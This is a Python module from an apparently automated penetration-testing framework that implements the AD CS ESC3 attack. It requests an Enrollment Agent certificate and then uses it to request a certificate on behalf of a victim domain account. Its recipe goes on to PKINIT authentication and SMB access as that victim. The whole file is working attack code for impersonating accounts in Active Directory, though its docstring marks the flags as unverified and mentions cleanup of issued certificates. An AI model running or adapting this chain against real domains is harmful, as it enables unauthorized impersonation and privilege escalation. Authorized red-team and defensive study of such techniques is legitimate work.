"""ADCS-ESC3: Enrollment Agent certificate -> on-behalf-of victim certificate.

UNVERIFIED ASSUMPTION: first ``req -template <template>`` issues an Enrollment
Agent cert for the operator. Second ``req -template <on_behalf_template> -pfx
<agent.pfx> -on-behalf-of '<DOMAIN>\\<victim>'`` issues the victim cert, subject
to enrollment-agent restrictions. Both requests are assumed to emit ESC1's
issuance / saved-PFX / serial markers (see ``_adcs_request_common``). The extra
request flags and markers need lab verification. Missing markers stop the chain
honestly. Both PFXs and the victim cache share one pre-write cleanup obligation.
"""
from ..recommend import ParamSpec
from ._adcs_request_common import ADCSRequestExecutor


class ADCSESC3Executor(ADCSRequestExecutor):
    technique = "ADCS-ESC3"
    template_default = "ESC3"
    template_description = "Enrollment Agent template used for the first certificate."
    recipe_ref = ("UNVERIFIED ADCS-ESC3: req Enrollment Agent -> req -pfx <EA> "
                  "-on-behalf-of <DOMAIN\\victim> -> auth (PKINIT) -> nxc smb -k; "
                  "verified destruction of both issued PFXs and the cache")

    def param_specs(self, ctx, finding):
        return super().param_specs(ctx, finding) + [ParamSpec(
            name="on_behalf_template", kind="free",
            description="Template permitting Enrollment Agent requests for the victim.",
            recommended=(finding.entity or {}).get("on_behalf_template") or "User",
            rationale="User is the conventional agent-enrollable authentication template; "
                      "override for the CA's agent restrictions.")]

    def _requests(self, cfg, v):
        victim = v["impersonate"]
        if "\\" not in victim:
            account, _, realm = victim.partition("@")
            victim = f"{realm or cfg.domain}\\{account}"
        return [
            ("enrollment_agent_request", v["template"], [], cfg.username or "cert"),
            ("cert_request", v["on_behalf_template"],
             ["-on-behalf-of", victim, "-pfx", "<enrollment-agent-pfx>"], v["impersonate"]),
        ]
